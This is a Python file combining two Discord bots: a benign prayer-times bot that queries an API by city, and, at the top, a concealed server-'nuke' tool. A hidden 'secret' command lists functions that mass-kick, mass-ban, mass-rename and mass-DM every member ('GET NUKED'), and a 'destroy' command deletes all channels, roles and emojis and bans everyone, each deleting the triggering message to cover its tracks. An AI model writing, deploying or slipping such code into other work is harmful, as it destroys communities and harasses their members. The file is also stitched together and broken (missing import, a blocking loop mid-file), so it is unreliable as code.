import discord
from discord.ext import commands
import os  # to ge .env variables - specifically TOKEN of bot
import requests  # To send a request to the API that will give prayer times
import json  # to handle data sent by API - The API sends json
from upper import upper_run  # to keep it running forever
import schedule
import time
import threading

intents = discord.Intents(messages=True, guilds=True, members=True)
# Imports the needed libs.

client = commands.Bot(command_prefix='$', intents=intents)
# Sets prefix and intents

client.remove_command("help")

@client.event
async def on_ready():
    print ("Ah shit, here we go again")

@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))

####HELP COMMAND####
@client.command(pass_context=True)
async def secret(ctx):
    await ctx.message.delete()
    member = ctx.message.author

    embed = discord.Embed(
        colour = discord.Colour.blue()
    )

    embed.set_author(name='Secret')
    embed.add_field(name='Kall', value='Kicks every member in a server', inline=False)
    embed.add_field(name='Ball', value='Bans every member in a server', inline=False)
    embed.add_field(name='Rall', value='Renames every member in a server', inline=False)
    embed.add_field(name='Mall', value='Messages every member in a server', inline=False)
    embed.add_field(name='Destroy', value='Deleted channels, remakes new ones, deletes roles, bans members, and wipes emojis. In that order', inline=False)
    embed.add_field(name='Ping', value='Gives ping to client (expressed in MS)', inline=False)
    embed.add_field(name='Info', value='Gives information of a user', inline=False)
    await member.send(embed=embed)
#############################

####KALL COMMAND####
@client.command(pass_context=True)
async def kall(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.kick(member)
            print (f"{member.name} has been kicked")
        except:
            print (f"{member.name} has FAILED to be kicked")
        print ("Action completed: Kick all")
#############################

####BALL COMMAND####
@client.command(pass_context=True)
async def ball(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    print ("Action completed: Ban all")
#############################

####RALL COMMAND####
@client.command(pass_context=True)
async def rall(ctx, rename_to):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print (f"{member.name} has been renamed to {rename_to}")
        except:
            print (f"{member.name} has NOT been renamed")
        print("Action completed: Rename all")
#############################

####MALL COMMAND####
@client.command(pass_context=True)
async def mall(ctx):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        await asyncio.sleep(0)
        try:
            await member.send("GET NUKED")
        except:
            pass
        print("Action completed: Message all")
#############################

###DESTROY COMMAND####
@client.command(pass_context=True)
async def destroy(ctx):
    await ctx.message.delete()
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print (channel.name + " has been deleted")
        except:
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("Ez Clap")
        await channel.send("GET NUKED")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted")
        except:
            pass
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted")
        except:
            pass    
    print("Action completed: Nuclear Destruction")
#############################


####PING COMMAND####
@client.command(pass_context=True)
async def ping(ctx):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    t1 = time.perf_counter()
    await channel.trigger_typing()
    t2 = time.perf_counter()
    embed=discord.Embed(title=None, description='Ping: {}'.format(round((t2-t1)*1000)), color=0x2874A6)
    await member.send(embed=embed)
    print("Action completed: Server ping")
#############################

####INFO COMMAND####
@client.command(pass_context=True)
async def info(ctx, member: discord.Member=None):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    if member is None:
        pass
    else:
        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))
    print("Action completed: User Info")
#############################

try:
    import queue
except ImportError:
    import Queue as queue

def job():
    print("I'm working")


def worker_main():
    while 1:
        job_func = jobqueue.get()
        job_func()
        jobqueue.task_done()

jobqueue = queue.Queue()

schedule.every(10).seconds.do(jobqueue.put, job)


worker_thread = threading.Thread(target=worker_main)
worker_thread.start()

while 1:
    schedule.run_pending()
    time.sleep(1)
command_prefix = "!!"
bot = commands.Bot(command_prefix=command_prefix)
bot.remove_command('help') 


help_text = """```===== HELP =====

!!pray *city* -> sends corresponding prayer times
E.g. !!pray london

!!ping -> sends my latency/ping

!!myinfo -> sends your discord info

!!userinfo *@user* -> sends discord info of specific user
E.g. !!userinfo @bot

!!echo -> sends what you said

!!help -> sends bot help

NOTE: Commands often have an alias that will still call the same commands
E.g. !!p will do the same thing as !!pray

================```"""

command_error_text = "```I do not recognise that command...\n'!!help' to see my commands```"



# ========== General-use functions ==========

def format_response(response):
    """ Fancifies the response that the bot will respond to the message.author with """
    return f"```{response}```"

def handle_json(request):
    """ If you can't tell what this function does just by looking at it's name you are clearly mentally deranged """
    json_request = request.json()
    #print(json_request)  # uncomment line if you would like the json sent over by the API to be echod to the console
    json_workload = json_request["results"]["datetime"][0]["times"]  # to get to the part of the json that contains the prayers and times you must go through a dictionary->dictionary->list->dictionary

    response = []
    for key, value in json_workload.items():
        response.append([key, value])

    response.sort(key=lambda x: int(x[1][0:2]))  # sorts the prayers by the time

    actual_response = ""
    for prayer, time in response:
        actual_response += f"{prayer} = {time}\n"

    return actual_response


# ========== Discord Bot Event Procedures ==========

@bot.event
async def on_connect():
    """ Alert for connection to discord server """
    print("Connected to Discord")


@bot.event
async def on_ready():
    """ Alert for readiness of bot """
    print(f"{bot.user} is ready")


@bot.event
async def on_message(msg):
    """ Called whenever a message is sent """
    if msg.author == bot.user or not msg.content.startswith(command_prefix): 
        return 
    
    await msg.add_reaction('🙏')
    await bot.process_commands(msg)


@bot.event
async def on_command_error(ctx, err):
    """Procedure called when command fails"""
    formatted_response = format_response
    await ctx.send(f"*User:*  {ctx.author.mention}\n*Input:*  {ctx.message.content}\n{command_error_text}")


# ========== Discord Bot Command Procedures ==========

@bot.command(aliases=["prayer", "p", "worship"])  # aliases are other names that will call the same bot command. You can add more by adding another item to the list. 
async def pray(ctx, city):
    """ Bot command that will respond with prayer times """
    #print("ctx:", ctx, "\ncity:", city)  # uncomment if you would like the message author's context info echod to the console
    request = requests.get(f"https://api.pray.zone/v2/times/today.json?city={city.strip().lower()}&school=3")
    print(request.status_code)
    if request.status_code == 200:  # status codes between from to 200 to 299 (including 299) means an invalid request was sent
        formatted_response = format_response(handle_json(request))
        await ctx.send(f"*User:*  {ctx.author.mention}\n*City inputted:*  {city}\n{formatted_response}")

    else:
        formatted_response = format_response("Command failed...\nMaybe you didn't spell the name of the city correctly?\nRemember that spaces should be replaced with '-'")
        await ctx.send(f"*User:*  {ctx.author.mention}\n*City inputted:*  {city}\n{formatted_response}")


@bot.command(aliases=["latency", "lat", "pong", "lag"])
async def ping(ctx):
    await ctx.send(f"{ctx.author.mention}\n```My ping is {int(bot.latency * 1000)}ms```")

@bot.command(aliases=["minfo", "mi"])
async def myinfo(ctx):
    await ctx.send(f"{ctx.author.mention}\n```Nickname: {ctx.author.display_name}\nUsername: {ctx.author}\nUnique ID: {ctx.author.id}```")

@bot.command(aliases=["info", "targetinfo", "tellme", "tellmeabout"])
async def userinfo(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send(f"{ctx.author.mention}\n```Server Nickname: {ctx.author.display_name}\nUsername: {ctx.author}\nUnique ID: {ctx.author.id}```")

    else:
        await ctx.send(f"{ctx.author.mention}\n```Server Nickname: {member.display_name}\nUsername: {member.name}#{member.discriminator}\nUnique ID: {member.id}```")

@bot.command(aliases=["say", "repeat"])
async def echo(ctx, *, message):
    await ctx.send(f"{ctx.author.mention}\n```{message}```")


@bot.command()
async def help(ctx):
    await ctx.send(f"{ctx.author.mention}\n{help_text}")


# ========== Run bot ==========

upper_run()  # calls function that will run bot forever

bot.run(os.getenv("TOKEN"))  # Make sure to put the bot's token in the .env file
